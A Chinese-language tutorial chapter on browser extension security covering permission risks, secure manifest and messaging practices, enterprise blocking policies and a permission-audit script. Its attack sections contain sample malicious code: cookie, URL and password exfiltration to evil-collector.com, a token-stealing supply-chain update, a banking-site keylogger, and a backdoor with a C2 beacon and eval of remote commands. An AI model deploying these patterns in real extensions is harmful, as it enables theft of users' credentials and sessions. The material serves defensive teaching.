# 浏览器扩展安全

## 概述

浏览器扩展拥有强大的权限：读取页面内容、修改网络请求、访问 Cookie、操控标签页。恶意扩展或存在漏洞的合法扩展都可能成为攻击入口。本章分析扩展安全机制和常见攻击面。

---

## 1. 扩展权限模型

### 1.1 Manifest V3 权限矩阵

```json
{
  "manifest_version": 3,
  "name": "Secure Extension Example",
  "version": "1.0",
  "permissions": [
    "storage",
    "activeTab",
    "scripting"
  ],
  "host_permissions": [
    "https://api.example.com/*"
  ],
  "content_security_policy": {
    "extension_pages": "script-src 'self'; object-src 'none'"
  }
}
```

| 权限 | 风险等级 | 攻击场景 |
|------|----------|----------|
| `activeTab` | 低 | 仅当前活动标签页 |
| `storage` | 低 | 本地存储，无网络 |
| `cookies` | 高 | 读取所有 Cookie |
| `webRequest` | 高 | 拦截/修改所有请求 |
| `debugger` | 极高 | 完全控制浏览器 |
| `<all_urls>` | 极高 | 访问所有网站数据 |
| `tabs` | 中 | 访问标签页 URL 和标题 |
| `downloads` | 中 | 触发下载 |
| `clipboardRead` | 中 | 读取剪贴板 |

---

## 2. 扩展攻击场景

### 2.1 恶意扩展数据窃取

```javascript
// 典型的恶意扩展模式
// background.js

// ❌ 恶意：劫持所有网络请求
chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
        // 收集所有请求的 URL 和 Cookie
        fetch('https://evil-collector.com/collect', {
            method: 'POST',
            body: JSON.stringify({
                url: details.url,
                method: details.method,
                timestamp: Date.now()
            })
        });
        return {};  // 不影响正常请求，隐蔽
    },
    {urls: ["<all_urls>"]},
    ["requestBody"]
);

// ❌ 恶意：读取 Cookie
chrome.cookies.getAll({}, function(cookies) {
    fetch('https://evil-collector.com/cookies', {
        method: 'POST',
        body: JSON.stringify(cookies)
    });
});

// ❌ 恶意：截取密码输入
document.addEventListener('input', function(e) {
    if (e.target.type === 'password') {
        fetch('https://evil-collector.com/passwords', {
            method: 'POST',
            body: JSON.stringify({value: e.target.value})
        });
    }
});
```

### 2.2 供应链攻击

```javascript
// 攻击方式：收购流行扩展 → 注入恶意代码 → 推送更新

// ✅ 正常代码（版本 1.0）
function formatText(text) {
    return text.trim().toLowerCase();
}

// ❌ 被篡改的代码（版本 1.1）
function formatText(text) {
    // 窃取 Token
    chrome.storage.local.get(['authToken'], function(result) {
        if (result.authToken) {
            sendToAttacker(result.authToken);
        }
    });

    // 表面上还是正常功能
    return text.trim().toLowerCase();
}
```

### 2.3 内容脚本注入

```javascript
// manifest.json
{
  "content_scripts": [
    {
      "matches": ["*://*.banking-site.com/*"],
      "js": ["injected.js"],
      "run_at": "document_start"
    }
  ]
}

// injected.js - 伪装成银行插件的键盘记录
document.addEventListener('keydown', function(e) {
    // 按键记录
    chrome.runtime.sendMessage({
        type: 'keylog',
        key: e.key,
        url: window.location.href,
        formFields: collectFormData()
    });
});
```

---

## 3. 安全扩展开发

### 3.1 最小权限原则

```json
// ✅ 好的例子：最小权限
{
  "permissions": ["storage"],
  "host_permissions": ["https://api.myapp.com/*"],
  "optional_permissions": ["notifications"],  // 运行时申请
  "optional_host_permissions": ["https://extra-api.com/*"]
}

// ❌ 坏的例子：过度权限
{
  "permissions": [
    "cookies", "webRequest", "tabs", "activeTab",
    "storage", "downloads", "notifications",
    "clipboardRead", "clipboardWrite", "debugger"
  ],
  "host_permissions": ["<all_urls>"]  // 访问所有网站
}
```

### 3.2 CSP 安全策略

```json
{
  "content_security_policy": {
    "extension_pages": "script-src 'self'; object-src 'none'; base-uri 'none';",
    "sandbox": "sandbox allow-scripts; script-src 'self'"
  }
}
```

### 3.3 消息安全

```javascript
// ✅ 安全：验证消息来源
chrome.runtime.onMessageExternal.addListener(
    function(request, sender, sendResponse) {
        // 验证来源
        const allowedOrigins = [
            'chrome-extension://myofficial-ext-id'
        ];
        if (!allowedOrigins.includes(sender.id)) {
            console.error('未授权的消息来源:', sender.id);
            return;
        }

        // 验证消息结构
        if (!request.action || typeof request.action !== 'string') {
            return;
        }

        // 白名单操作
        const allowedActions = ['getData', 'saveSettings'];
        if (!allowedActions.includes(request.action)) {
            console.error('未授权的操作:', request.action);
            return;
        }

        // 处理消息
        handleMessage(request.action, request.data);
    }
);
```

---

## 4. 扩展检测与审计

### 4.1 企业扩展管理

```json
// 通过 GPO/Intune 强制策略
{
  "ExtensionSettings": {
    "*": {
      "blocked_install_message": "请联系 IT 部门安装扩展",
      "installation_mode": "blocked"
    },
    "cjpalhdlnbpafiamejdnhcphjbkeiagm": {
      "installation_mode": "force_installed",
      "update_url": "https://clients2.google.com/service/update2/crx"
    },
    "ghbmnnjooekpmoecnnnilnnbdlolhkhi": {
      "installation_mode": "allowed"
    }
  },
  "ExtensionInstallForcelist": [
    "cjpalhdlnbpafiamejdnhcphjbkeiagm;https://clients2.google.com/service/update2/crx"
  ],
  "ExtensionInstallBlocklist": [
    "*"
  ]
}
```

### 4.2 扩展安全审计脚本

```python
import json
import os
import sqlite3
from pathlib import Path

class ExtensionSecurityAuditor:
    def __init__(self, chrome_profile_path):
        self.profile = Path(chrome_profile_path)

    def list_extensions(self):
        """列出所有已安装扩展及权限"""
        prefs_file = self.profile / 'Default' / 'Preferences'
        with open(prefs_file) as f:
            prefs = json.load(f)

        extensions = prefs.get('extensions', {}).get('settings', {})
        results = []
        for ext_id, ext_data in extensions.items():
            manifest = ext_data.get('manifest', {})
            results.append({
                'id': ext_id,
                'name': manifest.get('name', 'Unknown'),
                'version': manifest.get('version', '?'),
                'permissions': manifest.get('permissions', []),
                'host_permissions': manifest.get('host_permissions', []),
                'content_scripts': bool(manifest.get('content_scripts'))
            })
        return results

    def check_high_risk_extensions(self):
        """检查高风险扩展"""
        extensions = self.list_extensions()
        high_risk = []
        dangerous_perms = {'cookies', 'webRequest', 'debugger', '<all_urls>'}

        for ext in extensions:
            perms = set(ext['permissions']) | set(ext['host_permissions'])
            risky = perms & dangerous_perms

            if risky:
                high_risk.append({
                    'name': ext['name'],
                    'risky_permissions': list(risky),
                    'has_content_scripts': ext['content_scripts']
                })

        return high_risk

# 使用示例
auditor = ExtensionSecurityAuditor(os.path.expanduser('~/.config/google-chrome'))
risky = auditor.check_high_risk_extensions()

for ext in risky:
    print(f"[!] {ext['name']}")
    print(f"    风险权限: {', '.join(ext['risky_permissions'])}")
    if ext['has_content_scripts']:
        print(f"    含内容脚本: 可注入任意页面")
```

---

## 5. 红队视角：扩展后门

```javascript
// 后门扩展框架 (仅供安全研究)

// 1. C2 通信
chrome.alarms.create('beacon', {periodInMinutes: 5});
chrome.alarms.onAlarm.addListener(function(alarm) {
    if (alarm.name === 'beacon') {
        fetch('https://c2.example.com/heartbeat', {
            method: 'POST',
            body: JSON.stringify({
                id: chrome.runtime.id,
                tabs: getOpenTabs()
            })
        });
    }
});

// 2. 远程命令执行
chrome.storage.local.onChanged.addListener(function(changes) {
    if (changes['cmd'] && changes['cmd'].newValue) {
        eval(changes['cmd'].newValue);  // ⚠️ 远程代码执行
    }
});

// 3. 持久化（Service Worker 自动唤醒）
// Manifest V3 Service Worker 无需持久后台页面
```

---

## 参考资源

- [Chrome Extension Security](https://developer.chrome.com/docs/extensions/mv3/security/)
- [Firefox Extension Security](https://extensionworkshop.com/documentation/develop/build-a-secure-extension/)
- [Browser Extension Threat Model](https://www.usenix.org/conference/usenixsecurity19/)

---

*上一篇：[浏览器安全加固](./03-browser-hardening.md)*
